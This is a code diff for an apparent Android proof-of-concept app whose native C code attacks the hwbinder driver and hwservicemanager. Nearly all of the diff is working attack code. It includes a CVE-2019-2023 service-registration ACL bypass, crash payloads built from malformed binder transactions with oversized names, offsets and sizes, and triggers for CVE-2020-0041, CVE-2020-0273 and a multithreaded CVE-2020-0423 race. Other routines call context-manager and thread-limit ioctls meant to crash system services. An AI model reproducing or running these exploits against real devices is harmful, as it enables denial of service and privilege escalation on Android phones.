@@ -48,30 +48,17 @@ struct ion_handle_data {
     unsigned int handle;
 };
 
-// ==================== 追加構造体定義（binder.h にない場合） ====================
-#ifndef BINDER_SET_CONTEXT_MGR_EXT
-struct binder_set_context_mgr_ext {
-    uint32_t is_valid;
-    uint32_t flags;
-};
-#endif
-
-// ==================== グローバル変数 ====================
-static pid_t g_hwservicemanager_pid = -1;
 static volatile int g_exploit_success = 0;
 static char g_output_path[256] = "/data/local/tmp/cve_result.txt";
 static char g_log_path[256] = "/data/local/tmp/binder_traffic.log";
+static pid_t g_hwservicemanager_pid = -1;
 
-// ==================== プロトタイプ宣言 ====================
 static pid_t get_hwservicemanager_pid(void);
 static int exploit_cve_2019_2023(const char *service_name);
 static int crash_with_huge_name(void);
-static int send_malformed_transaction_enhanced(void);
 static int send_huge_data_transaction(void);
 static int trigger_cve_2020_0041(void);
 static int trigger_cve_2020_0273(void);
-static void* race_thread_worker(void *arg);
-static int trigger_cve_2020_0423_enhanced(void);
 static int crash_set_max_threads(void);
 static int crash_set_context_mgr(void);
 static int crash_set_idle_timeout(void);
@@ -79,11 +66,12 @@ static int crash_set_idle_priority(void);
 static int crash_null_buffer_transaction(void);
 static int crash_offsets_size_overflow(void);
 static int crash_set_context_mgr_ext(void);
+static int send_malformed_transaction_enhanced(void);
+static int trigger_cve_2020_0423_enhanced(void);
 static int crash_hwservicemanager(void);
 static int binder_server_loop(int binder_fd, int expected_handle);
 static void register_and_serve(const char *service_name);
 
-// ==================== JNI 基本関数（変更なし） ====================
 JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
     g_vm = vm;
     LOGD("JNI_OnLoad");
@@ -670,7 +658,6 @@ Java_com_example_tzpoc_MainActivity_nativeBinderSendTransaction(JNIEnv* env, jcl
     return (*env)->NewStringUTF(env, result);
 }
 
-// ==================== hwservicemanager PID 取得 ====================
 static pid_t get_hwservicemanager_pid(void) {
     FILE *fp = popen("pidof hwservicemanager 2>/dev/null", "r");
     if (fp) {
@@ -717,303 +704,6 @@ static pid_t get_hwservicemanager_pid(void) {
     }
     closedir(dir);
     return -1;
-}
-
-// ==================== CVE-2019-2023 (ACL bypass) ====================
-static int exploit_cve_2019_2023(const char *service_name) {
-    int hwbinder_fd, ret;
-    uint8_t read_buf[4096];
-    size_t name_len = strlen(service_name) + 1;
-    size_t total_len = 4 + name_len;
-    uint8_t *data;
-    int handle = -1;
-
-    LOGI("[CVE-2019-2023] registering '%s'...", service_name);
-
-    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd < 0) {
-        LOGE("open /dev/hwbinder failed: %s", strerror(errno));
-        return -1;
-    }
-
-    data = malloc(total_len);
-    if (!data) {
-        LOGE("malloc failed");
-        close(hwbinder_fd);
-        return -1;
-    }
-    *(uint32_t*)data = (uint32_t)name_len;
-    memcpy(data + 4, service_name, name_len);
-
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx;
-    tx.cmd = BC_TRANSACTION;
-    tx.tdata.target.handle = 0;
-    tx.tdata.code = 2;
-    tx.tdata.flags = 0;
-    tx.tdata.data_size = total_len;
-    tx.tdata.offsets_size = 0;
-    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
-    tx.tdata.data.ptr.offsets = 0;
-
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-    bwr.read_size = 0;
-    bwr.read_buffer = 0;
-
-    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-    free(data);
-    if (ret < 0) {
-        LOGE("ioctl ADD_SERVICE failed: %s", strerror(errno));
-        close(hwbinder_fd);
-        return -1;
-    }
-    LOGI("ADD_SERVICE succeeded!");
-
-    data = malloc(total_len);
-    if (!data) {
-        close(hwbinder_fd);
-        return -1;
-    }
-    *(uint32_t*)data = (uint32_t)name_len;
-    memcpy(data + 4, service_name, name_len);
-
-    tx.tdata.code = 1;
-    tx.tdata.data_size = total_len;
-    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
-
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-    bwr.read_size = sizeof(read_buf);
-    bwr.read_buffer = (binder_uintptr_t)read_buf;
-
-    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-    free(data);
-    if (ret < 0) {
-        LOGE("ioctl GET_SERVICE failed: %s", strerror(errno));
-        close(hwbinder_fd);
-        return -1;
-    }
-    if (bwr.read_consumed < 4) {
-        LOGE("No handle returned");
-        close(hwbinder_fd);
-        return -1;
-    }
-    handle = *(int*)read_buf;
-    LOGI("Service handle: %d", handle);
-    close(hwbinder_fd);
-    return handle;
-}
-
-// ==================== クラッシュペイロード ====================
-static int crash_with_huge_name(void) {
-    LOGI("Trying crash with 8KB service name...");
-    char *payload = malloc(8192);
-    if (!payload) return -1;
-    memset(payload, 'A', 8191);
-    payload[8191] = '\0';
-    int ret = exploit_cve_2019_2023(payload);
-    free(payload);
-    return ret;
-}
-
-static int send_malformed_transaction_enhanced(void) {
-    LOGI("Sending enhanced malformed transaction with invalid offsets...");
-    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd < 0) {
-        LOGE("open failed");
-        return -1;
-    }
-
-    uint8_t *data = malloc(4096);
-    if (!data) { close(hwbinder_fd); return -1; }
-    memset(data, 0x41, 4096);
-
-    binder_size_t offsets[10];
-    for (int i = 0; i < 10; i++) offsets[i] = 8192 + i * 8;
-
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx;
-    tx.cmd = BC_TRANSACTION;
-    tx.tdata.target.handle = 0;
-    tx.tdata.code = 0;
-    tx.tdata.flags = 0;
-    tx.tdata.data_size = 4096;
-    tx.tdata.offsets_size = sizeof(offsets);
-    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
-    tx.tdata.data.ptr.offsets = (binder_uintptr_t)offsets;
-
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-    bwr.read_size = 0;
-    bwr.read_buffer = 0;
-
-    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-    free(data);
-    close(hwbinder_fd);
-    if (ret < 0) {
-        LOGI("Enhanced malformed transaction sent (expected error)");
-        return 0;
-    }
-    LOGI("Enhanced malformed transaction succeeded unexpectedly");
-    return 0;
-}
-
-static int send_huge_data_transaction(void) {
-    LOGI("Sending transaction with huge data_size...");
-    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd < 0) {
-        LOGE("open failed");
-        return -1;
-    }
-
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx;
-    tx.cmd = BC_TRANSACTION;
-    tx.tdata.target.handle = 0;
-    tx.tdata.code = 0;
-    tx.tdata.flags = 0;
-    tx.tdata.data_size = 0xFFFFFFFF;
-    tx.tdata.offsets_size = 0;
-    tx.tdata.data.ptr.buffer = 0;
-    tx.tdata.data.ptr.offsets = 0;
-
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-    bwr.read_size = 0;
-    bwr.read_buffer = 0;
-
-    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-    close(hwbinder_fd);
-    if (ret < 0) {
-        LOGI("Huge data transaction sent (expected error)");
-        return 0;
-    }
-    LOGI("Huge data transaction succeeded unexpectedly");
-    return 0;
-}
-
-static int trigger_cve_2020_0041(void) {
-    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd < 0) {
-        LOGE("open /dev/hwbinder failed");
-        return -1;
-    }
-
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx;
-    tx.cmd = BC_TRANSACTION;
-    tx.tdata.target.handle = 0;
-    tx.tdata.code = 0;
-    tx.tdata.flags = 0;
-    tx.tdata.data_size = 4096;
-    tx.tdata.offsets_size = 0xFFFFFFFF;
-    tx.tdata.data.ptr.buffer = 0;
-    tx.tdata.data.ptr.offsets = 0;
-
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-    bwr.read_size = 0;
-    bwr.read_buffer = 0;
-
-    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-    close(hwbinder_fd);
-    if (ret < 0) {
-        LOGI("CVE-2020-0041 triggered (expected error)");
-        return 0;
-    }
-    LOGI("CVE-2020-0041: ioctl succeeded unexpectedly");
-    return 0;
-}
-
-static int trigger_cve_2020_0273(void) {
-    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd < 0) {
-        LOGE("open /dev/hwbinder failed");
-        return -1;
-    }
-
-    struct binder_node_info_for_ref info;
-    memset(&info, 0, sizeof(info));
-    info.handle = 0xFFFFFFFF;
-
-    int ret = ioctl(hwbinder_fd, BINDER_GET_NODE_INFO_FOR_REF, &info);
-    close(hwbinder_fd);
-    if (ret == 0) {
-        LOGI("CVE-2020-0273: info leaked? strong=%u weak=%u", info.strong_count, info.weak_count);
-        return 0;
-    }
-    LOGI("CVE-2020-0273: ioctl failed (expected): %s", strerror(errno));
-    return 0;
-}
-
-static void* race_thread_worker(void *arg) {
-    int hwbinder_fd = *(int*)arg;
-    for (int i = 0; i < 200; i++) {
-        struct binder_write_read bwr;
-        memset(&bwr, 0, sizeof(bwr));
-        ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-        usleep(50);
-    }
-    return NULL;
-}
-
-static int trigger_cve_2020_0423_enhanced(void) {
-    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd < 0) return -1;
-
-    pthread_t threads[8];
-    for (int i = 0; i < 8; i++) {
-        pthread_create(&threads[i], NULL, race_thread_worker, &hwbinder_fd);
-    }
-    for (int i = 0; i < 8; i++) {
-        pthread_join(threads[i], NULL);
-    }
-    close(hwbinder_fd);
-    LOGI("Enhanced race condition test completed with 8 threads");
-    return 0;
-}
-
-static int crash_set_max_threads(void) {
-    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd < 0) {
-        LOGE("open failed");
-        return -1;
-    }
-    uint32_t max_threads = 0xFFFFFFFF;
-    int ret = ioctl(hwbinder_fd, BINDER_SET_MAX_THREADS, &max_threads);
-    close(hwbinder_fd);
-    LOGI("BINDER_SET_MAX_THREADS ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
-    return (ret == 0) ? 0 : -1;
-}
-
-static int crash_set_context_mgr(void) {
-    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd < 0) {
-        LOGE("open failed");
-        return -1;
-    }
-    int ret = ioctl(hwbinder_fd, BINDER_SET_CONTEXT_MGR, 0);
-    close(hwbinder_fd);
-    LOGI("BINDER_SET_CONTEXT_MGR ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
-    return (ret == 0) ? 0 : -1;
 }
 
 static int crash_set_idle_timeout(void) {
@@ -1117,16 +807,313 @@ static int crash_set_context_mgr_ext(void) {
         LOGE("open /dev/hwbinder failed");
         return -1;
     }
-    struct binder_set_context_mgr_ext ext;
-    ext.is_valid = 1;
+    struct flat_binder_object ext;
+    memset(&ext, 0, sizeof(ext));
+    ext.hdr.type = BINDER_TYPE_BINDER;
     ext.flags = 0xFFFFFFFF;
+    ext.binder = 0;
+    ext.cookie = 0;
     int ret = ioctl(hwbinder_fd, BINDER_SET_CONTEXT_MGR_EXT, &ext);
     close(hwbinder_fd);
     LOGI("BINDER_SET_CONTEXT_MGR_EXT ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
     return (ret == 0) ? 0 : -1;
 }
 
-// ==================== 複合クラッシュ攻撃 ====================
+static int send_malformed_transaction_enhanced(void) {
+    LOGI("Sending enhanced malformed transaction with invalid offsets...");
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        LOGE("open failed");
+        return -1;
+    }
+
+    uint8_t *data = malloc(4096);
+    if (!data) { close(hwbinder_fd); return -1; }
+    memset(data, 0x41, 4096);
+
+    binder_size_t offsets[10];
+    for (int i = 0; i < 10; i++) offsets[i] = 8192 + i * 8;
+
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = 0;
+    tx.tdata.code = 0;
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = 4096;
+    tx.tdata.offsets_size = sizeof(offsets);
+    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+    tx.tdata.data.ptr.offsets = (binder_uintptr_t)offsets;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = 0;
+    bwr.read_buffer = 0;
+
+    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    free(data);
+    close(hwbinder_fd);
+    if (ret < 0) {
+        LOGI("Enhanced malformed transaction sent (expected error)");
+        return 0;
+    }
+    LOGI("Enhanced malformed transaction succeeded unexpectedly");
+    return 0;
+}
+
+static void* race_thread_worker(void *arg) {
+    int hwbinder_fd = *(int*)arg;
+    for (int i = 0; i < 200; i++) {
+        struct binder_write_read bwr;
+        memset(&bwr, 0, sizeof(bwr));
+        ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+        usleep(50);
+    }
+    return NULL;
+}
+
+static int trigger_cve_2020_0423_enhanced(void) {
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) return -1;
+
+    pthread_t threads[8];
+    for (int i = 0; i < 8; i++) {
+        pthread_create(&threads[i], NULL, race_thread_worker, &hwbinder_fd);
+    }
+    for (int i = 0; i < 8; i++) {
+        pthread_join(threads[i], NULL);
+    }
+    close(hwbinder_fd);
+    LOGI("Enhanced race condition test completed with 8 threads");
+    return 0;
+}
+
+static int exploit_cve_2019_2023(const char *service_name) {
+    int hwbinder_fd, ret;
+    uint8_t read_buf[4096];
+    size_t name_len = strlen(service_name) + 1;
+    size_t total_len = 4 + name_len;
+    uint8_t *data;
+    int handle = -1;
+
+    LOGI("[CVE-2019-2023] registering '%s'...", service_name);
+
+    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        LOGE("open /dev/hwbinder failed: %s", strerror(errno));
+        return -1;
+    }
+
+    data = malloc(total_len);
+    if (!data) {
+        LOGE("malloc failed");
+        close(hwbinder_fd);
+        return -1;
+    }
+    *(uint32_t*)data = (uint32_t)name_len;
+    memcpy(data + 4, service_name, name_len);
+
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = 0;
+    tx.tdata.code = 2;
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = total_len;
+    tx.tdata.offsets_size = 0;
+    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+    tx.tdata.data.ptr.offsets = 0;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = 0;
+    bwr.read_buffer = 0;
+
+    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    free(data);
+    if (ret < 0) {
+        LOGE("ioctl ADD_SERVICE failed: %s", strerror(errno));
+        close(hwbinder_fd);
+        return -1;
+    }
+    LOGI("ADD_SERVICE succeeded!");
+
+    data = malloc(total_len);
+    if (!data) {
+        close(hwbinder_fd);
+        return -1;
+    }
+    *(uint32_t*)data = (uint32_t)name_len;
+    memcpy(data + 4, service_name, name_len);
+
+    tx.tdata.code = 1;
+    tx.tdata.data_size = total_len;
+    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = sizeof(read_buf);
+    bwr.read_buffer = (binder_uintptr_t)read_buf;
+
+    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    free(data);
+    if (ret < 0) {
+        LOGE("ioctl GET_SERVICE failed: %s", strerror(errno));
+        close(hwbinder_fd);
+        return -1;
+    }
+    if (bwr.read_consumed < 4) {
+        LOGE("No handle returned");
+        close(hwbinder_fd);
+        return -1;
+    }
+    handle = *(int*)read_buf;
+    LOGI("Service handle: %d", handle);
+    close(hwbinder_fd);
+    return handle;
+}
+
+static int crash_with_huge_name(void) {
+    LOGI("Trying crash with 8KB service name...");
+    char *payload = malloc(8192);
+    if (!payload) return -1;
+    memset(payload, 'A', 8191);
+    payload[8191] = '\0';
+    int ret = exploit_cve_2019_2023(payload);
+    free(payload);
+    return ret;
+}
+
+static int send_huge_data_transaction(void) {
+    LOGI("Sending transaction with huge data_size...");
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        LOGE("open failed");
+        return -1;
+    }
+
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = 0;
+    tx.tdata.code = 0;
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = 0xFFFFFFFF;
+    tx.tdata.offsets_size = 0;
+    tx.tdata.data.ptr.buffer = 0;
+    tx.tdata.data.ptr.offsets = 0;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = 0;
+    bwr.read_buffer = 0;
+
+    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    close(hwbinder_fd);
+    if (ret < 0) {
+        LOGI("Huge data transaction sent (expected error)");
+        return 0;
+    }
+    LOGI("Huge data transaction succeeded unexpectedly");
+    return 0;
+}
+
+static int trigger_cve_2020_0041(void) {
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        LOGE("open /dev/hwbinder failed");
+        return -1;
+    }
+
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = 0;
+    tx.tdata.code = 0;
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = 4096;
+    tx.tdata.offsets_size = 0xFFFFFFFF;
+    tx.tdata.data.ptr.buffer = 0;
+    tx.tdata.data.ptr.offsets = 0;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = 0;
+    bwr.read_buffer = 0;
+
+    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    close(hwbinder_fd);
+    if (ret < 0) {
+        LOGI("CVE-2020-0041 triggered (expected error)");
+        return 0;
+    }
+    LOGI("CVE-2020-0041: ioctl succeeded unexpectedly");
+    return 0;
+}
+
+static int trigger_cve_2020_0273(void) {
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        LOGE("open /dev/hwbinder failed");
+        return -1;
+    }
+
+    struct binder_node_info_for_ref info;
+    memset(&info, 0, sizeof(info));
+    info.handle = 0xFFFFFFFF;
+
+    int ret = ioctl(hwbinder_fd, BINDER_GET_NODE_INFO_FOR_REF, &info);
+    close(hwbinder_fd);
+    if (ret == 0) {
+        LOGI("CVE-2020-0273: info leaked? strong=%u weak=%u", info.strong_count, info.weak_count);
+        return 0;
+    }
+    LOGI("CVE-2020-0273: ioctl failed (expected): %s", strerror(errno));
+    return 0;
+}
+
+static int crash_set_max_threads(void) {
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        LOGE("open failed");
+        return -1;
+    }
+    uint32_t max_threads = 0xFFFFFFFF;
+    int ret = ioctl(hwbinder_fd, BINDER_SET_MAX_THREADS, &max_threads);
+    close(hwbinder_fd);
+    LOGI("BINDER_SET_MAX_THREADS ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
+    return (ret == 0) ? 0 : -1;
+}
+
+static int crash_set_context_mgr(void) {
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        LOGE("open failed");
+        return -1;
+    }
+    int ret = ioctl(hwbinder_fd, BINDER_SET_CONTEXT_MGR, 0);
+    close(hwbinder_fd);
+    LOGI("BINDER_SET_CONTEXT_MGR ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
+    return (ret == 0) ? 0 : -1;
+}
+
 static int crash_hwservicemanager(void) {
     LOGI("Attempting enhanced multiple crash vectors...");
     int ret = 0;
@@ -1173,7 +1160,6 @@ static int crash_hwservicemanager(void) {
     }
 }
 
-// ==================== Binder サーバーループ ====================
 static int binder_server_loop(int binder_fd, int expected_handle) {
     uint8_t read_buf[4096];
     struct binder_write_read bwr;
@@ -1265,7 +1251,6 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
     return transaction_count;
 }
 
-// ==================== サービス登録＋サーバー起動 ====================
 static void register_and_serve(const char *service_name) {
     int handle = exploit_cve_2019_2023(service_name);
     if (handle < 0) {
@@ -1305,7 +1290,6 @@ static void register_and_serve(const char *service_name) {
     }
 }
 
-// ==================== JNI エクスポート関数 ====================
 JNIEXPORT jint JNICALL
 Java_com_example_tzpoc_MainActivity_nativeGetHwServicemanagerPid(JNIEnv* env, jclass clazz) {
     return get_hwservicemanager_pid();
